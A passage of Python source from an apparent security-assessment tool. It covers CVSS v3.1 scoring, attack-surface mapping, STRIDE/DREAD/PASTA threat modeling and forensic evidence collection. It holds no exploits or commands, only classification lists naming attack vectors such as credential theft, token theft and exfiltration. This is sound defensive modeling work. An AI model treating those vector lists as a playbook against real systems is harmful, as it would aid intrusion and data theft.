            return 'low'
        elif score < 0.6:
            return 'medium'
        elif score < 0.8:
            return 'high'
        return 'critical'
    
    def _get_probability(self, score: float) -> str:
        """Get probability level from score"""
        idx = min(4, int(score * 5))
        return self.PROBABILITY_LEVELS[idx]
    
    def _get_impact(self, category: str, nodes: List[Dict]) -> str:
        """Estimate impact level for a category"""
        # Simplified impact estimation
        if category in ['detection', 'attribution']:
            return 'high' if len(nodes) > 5 else 'medium'
        elif category == 'collateral':
            return 'critical' if any('destruct' in n.get('type', '').lower() for n in nodes) else 'low'
        return 'medium'
    
    def _get_risk_rating(self, score: float) -> str:
        """Get overall risk rating"""
        if score < 0.3:
            return 'ACCEPTABLE'
        elif score < 0.5:
            return 'TOLERABLE'
        elif score < 0.7:
            return 'SIGNIFICANT'
        return 'UNACCEPTABLE'
    
    def _generate_heatmap_data(self, matrix: Dict) -> List[List]:
        """Generate 2D heatmap data for visualization"""
        # 5x5 matrix: probability vs impact
        heatmap = [[0] * 5 for _ in range(5)]
        
        for category_id, data in matrix.items():
            prob_idx = self.PROBABILITY_LEVELS.index(data['probability'])
            impact_idx = self.IMPACT_LEVELS.index(data['impact'])
            heatmap[prob_idx][impact_idx] = max(heatmap[prob_idx][impact_idx], data['score'])
        
        return heatmap


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# CVSS CALCULATOR INTEGRATION - Calculate vulnerability scores
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class CVSSCalculator:
    """
    CVSS v3.1 Calculator for vulnerability scoring
    """
    
    # Attack Vector values
    ATTACK_VECTOR = {
        'N': {'name': 'Network', 'value': 0.85},
        'A': {'name': 'Adjacent', 'value': 0.62},
        'L': {'name': 'Local', 'value': 0.55},
        'P': {'name': 'Physical', 'value': 0.20}
    }
    
    # Attack Complexity values
    ATTACK_COMPLEXITY = {
        'L': {'name': 'Low', 'value': 0.77},
        'H': {'name': 'High', 'value': 0.44}
    }
    
    # Privileges Required values
    PRIVILEGES_REQUIRED = {
        'N': {'name': 'None', 'value': 0.85, 'value_changed': 0.85},
        'L': {'name': 'Low', 'value': 0.62, 'value_changed': 0.68},
        'H': {'name': 'High', 'value': 0.27, 'value_changed': 0.50}
    }
    
    # User Interaction values
    USER_INTERACTION = {
        'N': {'name': 'None', 'value': 0.85},
        'R': {'name': 'Required', 'value': 0.62}
    }
    
    # Impact values
    IMPACT = {
        'N': {'name': 'None', 'value': 0.0},
        'L': {'name': 'Low', 'value': 0.22},
        'H': {'name': 'High', 'value': 0.56}
    }
    
    def calculate_base_score(self, vector_string: str) -> Dict:
        """Calculate CVSS base score from vector string"""
        # Parse vector string (e.g., "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
        metrics = self._parse_vector(vector_string)
        
        if not metrics:
            return {'error': 'Invalid vector string', 'score': 0.0}
        
        # Extract values
        av = self.ATTACK_VECTOR.get(metrics.get('AV', 'N'), {'value': 0.85})['value']
        ac = self.ATTACK_COMPLEXITY.get(metrics.get('AC', 'L'), {'value': 0.77})['value']
        
        scope_changed = metrics.get('S', 'U') == 'C'
        pr_key = metrics.get('PR', 'N')
        if scope_changed:
            pr = self.PRIVILEGES_REQUIRED.get(pr_key, {'value_changed': 0.85})['value_changed']
        else:
            pr = self.PRIVILEGES_REQUIRED.get(pr_key, {'value': 0.85})['value']
        
        ui = self.USER_INTERACTION.get(metrics.get('UI', 'N'), {'value': 0.85})['value']
        
        c = self.IMPACT.get(metrics.get('C', 'N'), {'value': 0.0})['value']
        i = self.IMPACT.get(metrics.get('I', 'N'), {'value': 0.0})['value']
        a = self.IMPACT.get(metrics.get('A', 'N'), {'value': 0.0})['value']
        
        # Calculate Impact Sub Score (ISS)
        iss = 1 - ((1 - c) * (1 - i) * (1 - a))
        
        # Calculate Impact
        if scope_changed:
            impact = 7.52 * (iss - 0.029) - 3.25 * pow(iss - 0.02, 15)
        else:
            impact = 6.42 * iss
        
        # Calculate Exploitability
        exploitability = 8.22 * av * ac * pr * ui
        
        # Calculate Base Score
        if impact <= 0:
            base_score = 0.0
        elif scope_changed:
            base_score = min(10.0, 1.08 * (impact + exploitability))
        else:
            base_score = min(10.0, impact + exploitability)
        
        # Round up to 1 decimal
        import math
        base_score = math.ceil(base_score * 10) / 10
        
        return {
            'score': base_score,
            'severity': self._get_severity(base_score),
            'impact_score': round(impact, 2),
            'exploitability_score': round(exploitability, 2),
            'vector_string': vector_string,
            'metrics': metrics
        }
    
    def _parse_vector(self, vector_string: str) -> Optional[Dict]:
        """Parse CVSS vector string into metrics"""
        if not vector_string:
            return None
        
        # Remove CVSS prefix if present
        if vector_string.startswith('CVSS:'):
            parts = vector_string.split('/')
            parts = parts[1:]  # Skip version
        else:
            parts = vector_string.split('/')
        
        metrics = {}
        for part in parts:
            if ':' in part:
                key, value = part.split(':', 1)
                metrics[key] = value
        
        return metrics if metrics else None
    
    def _get_severity(self, score: float) -> str:
        """Get severity rating from score"""
        if score == 0.0:
            return 'None'
        elif score < 4.0:
            return 'Low'
        elif score < 7.0:
            return 'Medium'
        elif score < 9.0:
            return 'High'
        return 'Critical'
    
    def generate_vector_string(self, av: str, ac: str, pr: str, ui: str, 
                               s: str, c: str, i: str, a: str) -> str:
        """Generate CVSS vector string from individual metrics"""
        return f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
    
    def get_metrics_help(self) -> Dict:
        """Get help text for all metrics"""
        return {
            'AV': {
                'name': 'Attack Vector',
                'options': {k: v['name'] for k, v in self.ATTACK_VECTOR.items()}
            },
            'AC': {
                'name': 'Attack Complexity',
                'options': {k: v['name'] for k, v in self.ATTACK_COMPLEXITY.items()}
            },
            'PR': {
                'name': 'Privileges Required',
                'options': {k: v['name'] for k, v in self.PRIVILEGES_REQUIRED.items()}
            },
            'UI': {
                'name': 'User Interaction',
                'options': {k: v['name'] for k, v in self.USER_INTERACTION.items()}
            },
            'S': {
                'name': 'Scope',
                'options': {'U': 'Unchanged', 'C': 'Changed'}
            },
            'C': {
                'name': 'Confidentiality Impact',
                'options': {k: v['name'] for k, v in self.IMPACT.items()}
            },
            'I': {
                'name': 'Integrity Impact',
                'options': {k: v['name'] for k, v in self.IMPACT.items()}
            },
            'A': {
                'name': 'Availability Impact',
                'options': {k: v['name'] for k, v in self.IMPACT.items()}
            }
        }


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK SURFACE MAPPER - Map and visualize attack surface
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackSurfaceMapper:
    """
    Map and analyze the attack surface based on chain targets
    """
    
    # Asset categories
    ASSET_CATEGORIES = {
        'network': {
            'name': 'Network Assets',
            'types': ['router', 'switch', 'firewall', 'load_balancer', 'vpn'],
            'color': '#00d4ff'
        },
        'server': {
            'name': 'Server Assets',
            'types': ['web_server', 'db_server', 'file_server', 'mail_server', 'app_server'],
            'color': '#ff6b6b'
        },
        'endpoint': {
            'name': 'Endpoint Assets',
            'types': ['workstation', 'laptop', 'mobile', 'iot_device'],
            'color': '#4ecdc4'
        },
        'cloud': {
            'name': 'Cloud Assets',
            'types': ['vm', 'container', 'serverless', 'storage', 'database'],
            'color': '#9b59b6'
        },
        'identity': {
            'name': 'Identity Assets',
            'types': ['user_account', 'service_account', 'admin_account', 'api_key'],
            'color': '#f39c12'
        },
        'data': {
            'name': 'Data Assets',
            'types': ['pii', 'credentials', 'intellectual_property', 'financial'],
            'color': '#e74c3c'
        }
    }
    
    # Attack vectors per category
    ATTACK_VECTORS = {
        'network': ['port_scan', 'mitm', 'dos', 'packet_injection'],
        'server': ['exploit', 'rce', 'sqli', 'file_inclusion'],
        'endpoint': ['malware', 'phishing', 'usb_attack', 'keylogger'],
        'cloud': ['misconfiguration', 'api_abuse', 'container_escape', 'credential_theft'],
        'identity': ['credential_stuffing', 'brute_force', 'social_engineering', 'token_theft'],
        'data': ['exfiltration', 'encryption', 'manipulation', 'destruction']
    }
    
    def __init__(self):
        self.mapped_assets: Dict[str, Dict] = {}
        self.attack_paths: List[Dict] = []
        
    def map_surface_from_chain(self, nodes: List[Dict]) -> Dict:
        """Map attack surface from chain nodes"""
        surface = {
            'assets': {},
            'vectors': {},
            'exposure_score': 0,
            'critical_assets': [],
            'attack_paths': []
        }
        
        for node in nodes:
            # Identify asset category from node
            asset_info = self._identify_asset(node)
            if asset_info:
                category = asset_info['category']
                if category not in surface['assets']:
                    surface['assets'][category] = []
                surface['assets'][category].append(asset_info)
                
                # Map attack vectors
                if category not in surface['vectors']:
                    surface['vectors'][category] = set()
                surface['vectors'][category].update(
                    self.ATTACK_VECTORS.get(category, [])
                )
        
        # Convert sets to lists for JSON serialization
        surface['vectors'] = {k: list(v) for k, v in surface['vectors'].items()}
        
        # Calculate exposure score
        surface['exposure_score'] = self._calculate_exposure(surface)
        
        # Identify critical assets
        surface['critical_assets'] = self._identify_critical_assets(surface['assets'])
        
        return surface
    
    def _identify_asset(self, node: Dict) -> Optional[Dict]:
        """Identify asset category and type from node"""
        node_type = node.get('type', '').lower()
        node_name = node.get('name', '').lower()
        
        for category, info in self.ASSET_CATEGORIES.items():
            for asset_type in info['types']:
                if asset_type in node_type or asset_type in node_name:
                    return {
                        'category': category,
                        'type': asset_type,
                        'node_id': node.get('id'),
                        'node_name': node.get('name'),
                        'exposure': node.get('exposure', 0.5),
                        'color': info['color']
                    }
        
        # Default categorization based on keywords
        if any(kw in node_type for kw in ['scan', 'recon', 'enum']):
            return {
                'category': 'network',
                'type': 'unknown',
                'node_id': node.get('id'),
                'node_name': node.get('name'),
                'exposure': 0.5,
                'color': self.ASSET_CATEGORIES['network']['color']
            }
        
        return None
    
    def _calculate_exposure(self, surface: Dict) -> float:
        """Calculate overall exposure score"""
        total_assets = sum(len(assets) for assets in surface['assets'].values())
        if total_assets == 0:
            return 0.0
        
        # Weight by category risk
        category_weights = {
            'identity': 1.0,
            'data': 0.9,
            'server': 0.8,
            'cloud': 0.7,
            'endpoint': 0.6,
            'network': 0.5
        }
        
        weighted_sum = sum(
            len(assets) * category_weights.get(cat, 0.5)
            for cat, assets in surface['assets'].items()
        )
        
        return min(1.0, weighted_sum / (total_assets * 0.7))
    
    def _identify_critical_assets(self, assets: Dict) -> List[Dict]:
        """Identify critical assets that need protection"""
        critical = []
        
        high_value_categories = ['identity', 'data', 'server']
        for category in high_value_categories:
            for asset in assets.get(category, []):
                critical.append({
                    'asset': asset,
                    'priority': 'high',
                    'recommendation': f"Implement additional controls for {asset['node_name']}"
                })
        
        return critical[:10]  # Top 10 critical assets
    
    def generate_surface_report(self, surface: Dict) -> str:
        """Generate attack surface report"""
        report = ["=" * 60, "ATTACK SURFACE ANALYSIS REPORT", "=" * 60, ""]
        
        # Summary
        report.append("SUMMARY")
        report.append("-" * 40)
        report.append(f"Overall Exposure Score: {surface['exposure_score']:.2f}")
        report.append(f"Total Asset Categories: {len(surface['assets'])}")
        report.append(f"Total Attack Vectors: {sum(len(v) for v in surface['vectors'].values())}")
        report.append("")
        
        # Assets by category
        report.append("ASSETS BY CATEGORY")
        report.append("-" * 40)
        for category, assets in surface['assets'].items():
            cat_info = self.ASSET_CATEGORIES.get(category, {'name': category})
            report.append(f"\n{cat_info['name']} ({len(assets)} assets):")
            for asset in assets[:5]:
                report.append(f"  ‚Ä¢ {asset['node_name']} ({asset['type']})")
        report.append("")
        
        # Attack vectors
        report.append("POTENTIAL ATTACK VECTORS")
        report.append("-" * 40)
        for category, vectors in surface['vectors'].items():
            report.append(f"\n{category.title()}:")
            for vector in vectors:
                report.append(f"  ‚Ä¢ {vector.replace('_', ' ').title()}")
        report.append("")
        
        # Critical assets
        if surface['critical_assets']:
            report.append("CRITICAL ASSETS REQUIRING ATTENTION")
            report.append("-" * 40)
            for item in surface['critical_assets']:
                report.append(f"  ‚ö† {item['asset']['node_name']}")
                report.append(f"    {item['recommendation']}")
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# THREAT MODELING ENGINE - STRIDE, PASTA, and DREAD frameworks
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ThreatModelingEngine:
    """
    Comprehensive threat modeling using STRIDE, PASTA, and DREAD methodologies
    """
    
    # STRIDE threat categories
    STRIDE_CATEGORIES = {
        'spoofing': {
            'name': 'Spoofing',
            'description': 'Pretending to be something or someone else',
            'security_property': 'Authentication',
            'examples': ['Credential theft', 'Session hijacking', 'IP spoofing'],
            'mitigations': ['Strong authentication', 'MFA', 'Certificate validation']
        },
        'tampering': {
            'name': 'Tampering',
            'description': 'Modifying data or code',
            'security_property': 'Integrity',
            'examples': ['SQL injection', 'Code injection', 'Man-in-the-middle'],
            'mitigations': ['Input validation', 'Digital signatures', 'Integrity checks']
        },
        'repudiation': {
            'name': 'Repudiation',
            'description': 'Claiming to not have performed an action',
            'security_property': 'Non-repudiation',
            'examples': ['Log tampering', 'Unsigned transactions', 'Anonymous actions'],
            'mitigations': ['Audit logging', 'Digital signatures', 'Timestamps']
        },
        'information_disclosure': {
            'name': 'Information Disclosure',
            'description': 'Exposing information to unauthorized users',
            'security_property': 'Confidentiality',
            'examples': ['Data breach', 'Error messages', 'Directory traversal'],
            'mitigations': ['Encryption', 'Access controls', 'Data classification']
        },
        'denial_of_service': {
            'name': 'Denial of Service',
            'description': 'Deny or degrade service to users',
            'security_property': 'Availability',
            'examples': ['DDoS', 'Resource exhaustion', 'Crash exploits'],
            'mitigations': ['Rate limiting', 'Redundancy', 'Input validation']
        },
        'elevation_of_privilege': {
            'name': 'Elevation of Privilege',
            'description': 'Gain capabilities without authorization',
            'security_property': 'Authorization',
            'examples': ['Privilege escalation', 'Buffer overflow', 'IDOR'],
            'mitigations': ['Least privilege', 'Sandboxing', 'Input validation']
        }
    }
    
    # DREAD scoring factors
    DREAD_FACTORS = {
        'damage': {
            'name': 'Damage Potential',
            'description': 'How bad would an attack be?',
            'scale': {0: 'Nothing', 5: 'Individual user data', 10: 'Complete system destruction'}
        },
        'reproducibility': {
            'name': 'Reproducibility',
            'description': 'How easy is it to reproduce?',
            'scale': {0: 'Very hard', 5: 'Requires specific conditions', 10: 'Easy/always'}
        },
        'exploitability': {
            'name': 'Exploitability',
            'description': 'What is needed to exploit?',
            'scale': {0: 'Advanced skills + custom tools', 5: 'Skilled attacker', 10: 'Script kiddie'}
        },
        'affected_users': {
            'name': 'Affected Users',
            'description': 'How many users are affected?',
            'scale': {0: 'None', 5: 'Some users', 10: 'All users'}
        },
        'discoverability': {
            'name': 'Discoverability',
            'description': 'How easy is it to discover?',
            'scale': {0: 'Very hard', 5: 'Requires source code', 10: 'Publicly known'}
        }
    }
    
    # PASTA stages
    PASTA_STAGES = [
        {'stage': 1, 'name': 'Define Objectives', 'activities': ['Identify business objectives', 'Identify security requirements']},
        {'stage': 2, 'name': 'Define Technical Scope', 'activities': ['Identify technical assets', 'Map dependencies']},
        {'stage': 3, 'name': 'Decompose Application', 'activities': ['Identify data flows', 'Identify trust boundaries']},
        {'stage': 4, 'name': 'Threat Analysis', 'activities': ['Identify threat actors', 'Analyze attack scenarios']},
        {'stage': 5, 'name': 'Vulnerability Analysis', 'activities': ['Identify vulnerabilities', 'Map to threats']},
        {'stage': 6, 'name': 'Attack Modeling', 'activities': ['Build attack trees', 'Simulate attacks']},
        {'stage': 7, 'name': 'Risk/Impact Analysis', 'activities': ['Calculate risk scores', 'Prioritize mitigations']}
    ]
    
    def __init__(self):
        self.threat_models: Dict[str, Dict] = {}
        
    def analyze_stride(self, nodes: List[Dict], edges: List[Dict]) -> Dict:
        """Perform STRIDE threat analysis on the chain"""
        analysis = {cat: {'threats': [], 'count': 0, 'severity': 'low'} 
                   for cat in self.STRIDE_CATEGORIES}
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            node_name = node.get('name', '')
            
            # Map node types to STRIDE categories
            stride_mapping = {
                'spoofing': ['phish', 'spoof', 'credential', 'imperson', 'session'],
                'tampering': ['inject', 'modify', 'tamper', 'mitm', 'manipulation'],
                'repudiation': ['log', 'audit', 'trace'],
                'information_disclosure': ['exfil', 'leak', 'dump', 'extract', 'scrape'],
                'denial_of_service': ['dos', 'flood', 'crash', 'exhaust', 'overload'],
                'elevation_of_privilege': ['privesc', 'escalat', 'root', 'admin', 'bypass']
            }
            
            for category, keywords in stride_mapping.items():
                if any(kw in node_type or kw in node_name.lower() for kw in keywords):
                    analysis[category]['threats'].append({
                        'node_id': node.get('id'),
                        'node_name': node_name,
                        'node_type': node_type,
                        'category_info': self.STRIDE_CATEGORIES[category]
                    })
                    analysis[category]['count'] += 1
        
        # Calculate severity for each category
        for category in analysis:
            count = analysis[category]['count']
            if count >= 3:
                analysis[category]['severity'] = 'critical'
            elif count >= 2:
                analysis[category]['severity'] = 'high'
            elif count >= 1:
                analysis[category]['severity'] = 'medium'
        
        return analysis
    
    def calculate_dread(self, threat: Dict) -> Dict:
        """Calculate DREAD score for a threat"""
        # Get values from threat or use defaults
        damage = threat.get('damage', 5)
        reproducibility = threat.get('reproducibility', 5)
        exploitability = threat.get('exploitability', 5)
        affected_users = threat.get('affected_users', 5)
        discoverability = threat.get('discoverability', 5)
        
        total = damage + reproducibility + exploitability + affected_users + discoverability
        average = total / 5
        
        if average >= 8:
            risk_level = 'Critical'
        elif average >= 6:
            risk_level = 'High'
        elif average >= 4:
            risk_level = 'Medium'
        else:
            risk_level = 'Low'
        
        return {
            'scores': {
                'damage': damage,
                'reproducibility': reproducibility,
                'exploitability': exploitability,
                'affected_users': affected_users,
                'discoverability': discoverability
            },
            'total': total,
            'average': round(average, 2),
            'risk_level': risk_level
        }
    
    def run_pasta_analysis(self, nodes: List[Dict], edges: List[Dict], 
                          context: Dict) -> Dict:
        """Run PASTA threat modeling process"""
        pasta_results = {}
        
        for stage_info in self.PASTA_STAGES:
            stage_num = stage_info['stage']
            pasta_results[stage_num] = {
                'name': stage_info['name'],
                'status': 'completed',
                'findings': []
            }
            
            if stage_num == 1:
                # Define Objectives
                pasta_results[stage_num]['findings'] = [
                    f"Business Objective: {context.get('objective', 'Security assessment')}",
                    f"Chain contains {len(nodes)} attack stages"
                ]
            
            elif stage_num == 2:
                # Technical Scope
                node_types = list(set(n.get('type', 'unknown') for n in nodes))
                pasta_results[stage_num]['findings'] = [
                    f"Identified {len(node_types)} unique attack techniques",
                    f"Attack chain complexity: {len(edges)} dependencies"
                ]
            
            elif stage_num == 3:
                # Decompose Application
                entry_points = [n for n in nodes if not any(e.get('target') == n.get('id') for e in edges)]
                exit_points = [n for n in nodes if not any(e.get('source') == n.get('id') for e in edges)]
                pasta_results[stage_num]['findings'] = [
                    f"Entry points: {len(entry_points)}",
                    f"Exit points: {len(exit_points)}",
                    f"Data flow paths: {len(edges)}"
                ]
            
            elif stage_num == 4:
                # Threat Analysis
                stride = self.analyze_stride(nodes, edges)
                threats = sum(s['count'] for s in stride.values())
                pasta_results[stage_num]['findings'] = [
                    f"Total STRIDE threats identified: {threats}",
                    *[f"{cat.replace('_', ' ').title()}: {s['count']} ({s['severity']})" 
                      for cat, s in stride.items() if s['count'] > 0]
                ]
            
            elif stage_num == 5:
                # Vulnerability Analysis
                vulns = [n for n in nodes if any(kw in n.get('type', '').lower() 
                        for kw in ['vuln', 'cve', 'exploit'])]
                pasta_results[stage_num]['findings'] = [
                    f"Vulnerability-related nodes: {len(vulns)}",
                    *[f"- {v.get('name', 'Unknown')}" for v in vulns[:5]]
                ]
            
            elif stage_num == 6:
                # Attack Modeling
                pasta_results[stage_num]['findings'] = [
                    f"Attack chain modeled with {len(nodes)} stages",
                    f"Attack dependencies: {len(edges)}",
                    "Attack tree: Fully constructed"
                ]
            
            elif stage_num == 7:
                # Risk Analysis
                total_risk = len(nodes) * 0.1 * (1 + len(edges) * 0.05)
                pasta_results[stage_num]['findings'] = [
                    f"Aggregate risk score: {min(10, total_risk):.2f}/10",
                    f"Priority: {'High' if total_risk > 5 else 'Medium' if total_risk > 2 else 'Low'}"
                ]
        
        return pasta_results
    
    def generate_threat_model_report(self, stride: Dict, dread: Dict, 
                                     pasta: Dict) -> str:
        """Generate comprehensive threat model report"""
        report = ["=" * 70, "COMPREHENSIVE THREAT MODEL REPORT", "=" * 70, ""]
        
        # STRIDE Section
        report.append("STRIDE THREAT ANALYSIS")
        report.append("-" * 50)
        for category, data in stride.items():
            if data['count'] > 0:
                cat_info = self.STRIDE_CATEGORIES[category]
                report.append(f"\n{cat_info['name']} ({data['severity'].upper()})")
                report.append(f"  Description: {cat_info['description']}")
                report.append(f"  Threats Found: {data['count']}")
                report.append(f"  Mitigations: {', '.join(cat_info['mitigations'][:2])}")
        report.append("")
        
        # DREAD Section
        if dread:
            report.append("DREAD RISK ASSESSMENT")
            report.append("-" * 50)
            report.append(f"Risk Level: {dread.get('risk_level', 'Unknown')}")
            report.append(f"Average Score: {dread.get('average', 0)}/10")
            if 'scores' in dread:
                for factor, score in dread['scores'].items():
                    report.append(f"  {factor.title()}: {score}/10")
        report.append("")
        
        # PASTA Section
        report.append("PASTA PROCESS RESULTS")
        report.append("-" * 50)
        for stage_num, stage_data in pasta.items():
            report.append(f"\nStage {stage_num}: {stage_data['name']}")
            for finding in stage_data.get('findings', [])[:3]:
                report.append(f"  ‚Ä¢ {finding}")
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# FORENSIC EVIDENCE COLLECTOR - Collect and document attack artifacts
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ForensicEvidenceCollector:
    """
    Collect, document, and preserve forensic evidence from attack chains
    """
    
    # Evidence categories
    EVIDENCE_CATEGORIES = {
        'network': {
            'name': 'Network Evidence',
            'artifacts': ['pcap', 'netflow', 'dns_logs', 'firewall_logs', 'proxy_logs'],
            'preservation': 'Capture full packets, maintain chain of custody'
        },
        'host': {
            'name': 'Host Evidence',
            'artifacts': ['memory_dump', 'disk_image', 'registry', 'event_logs', 'prefetch'],
            'preservation': 'Create forensic images, document hash values'
        },
        'application': {
            'name': 'Application Evidence',
            'artifacts': ['app_logs', 'db_logs', 'web_logs', 'error_logs', 'audit_logs'],
            'preservation': 'Preserve log files, maintain timestamps'
        },
        'malware': {
            'name': 'Malware Evidence',
            'artifacts': ['binary_sample', 'script', 'dropper', 'c2_config', 'encryption_key'],
            'preservation': 'Isolate samples, calculate multiple hashes'
        },
        'identity': {
            'name': 'Identity Evidence',
            'artifacts': ['auth_logs', 'session_data', 'token', 'credential_dump', 'mfa_logs'],
            'preservation': 'Secure storage, access logging'
        },
        'timeline': {
            'name': 'Timeline Evidence',
            'artifacts': ['filesystem_timeline', 'registry_timeline', 'browser_history', 'user_activity'],
            'preservation': 'Create super timeline, correlate sources'
        }
    }
    
    # Hash algorithms for evidence integrity
    HASH_ALGORITHMS = ['md5', 'sha1', 'sha256', 'sha512']
    
    def __init__(self):
        self.evidence_items: List[Dict] = []
        self.chain_of_custody: List[Dict] = []
        self.collection_id: Optional[str] = None
        
    def start_collection(self, case_id: str, investigator: str) -> str:
        """Start a new evidence collection session"""
        import uuid
        self.collection_id = f"EV-{uuid.uuid4().hex[:8].upper()}"
        self.evidence_items = []
        self.chain_of_custody = [{
            'action': 'collection_started',
            'timestamp': datetime.now().isoformat(),
            'investigator': investigator,
            'case_id': case_id,
            'collection_id': self.collection_id
        }]
        return self.collection_id
    
    def collect_evidence_from_chain(self, nodes: List[Dict]) -> List[Dict]:
        """Collect expected evidence from attack chain nodes"""
        import uuid
        
        collected = []
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            node_name = node.get('name', '')
            
            # Determine expected evidence based on node type
            expected_evidence = self._determine_evidence(node_type)
            
            for evidence_type in expected_evidence:
                evidence_item = {
                    'evidence_id': f"EV-{uuid.uuid4().hex[:8].upper()}",
                    'collection_id': self.collection_id,
                    'category': evidence_type['category'],
